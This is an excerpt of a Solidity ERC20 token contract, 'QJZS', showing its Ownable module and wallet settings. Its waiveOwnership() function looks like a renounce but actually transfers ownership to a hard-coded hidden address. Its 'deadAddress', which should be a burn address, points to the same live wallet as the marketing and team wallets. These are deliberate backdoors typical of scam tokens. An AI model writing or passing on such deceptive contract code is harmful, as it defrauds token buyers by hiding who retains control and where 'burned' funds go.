...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x256aA456F078569B93C6bD3b058209Aa696F91A6));
        _owner = address(0x256aA456F078569B93C6bD3b058209Aa696F91A6);
    }
...
contract QJZS  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "QJZS ";
    string private _symbol = "QJZS ";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x8566D4e2ffE5A26e8a64DCC8CFd21886701447d4);
    address payable public teamWalletAddress = payable(0x8566D4e2ffE5A26e8a64DCC8CFd21886701447d4);
    address public immutable deadAddress = 0x8566D4e2ffE5A26e8a64DCC8CFd21886701447d4;
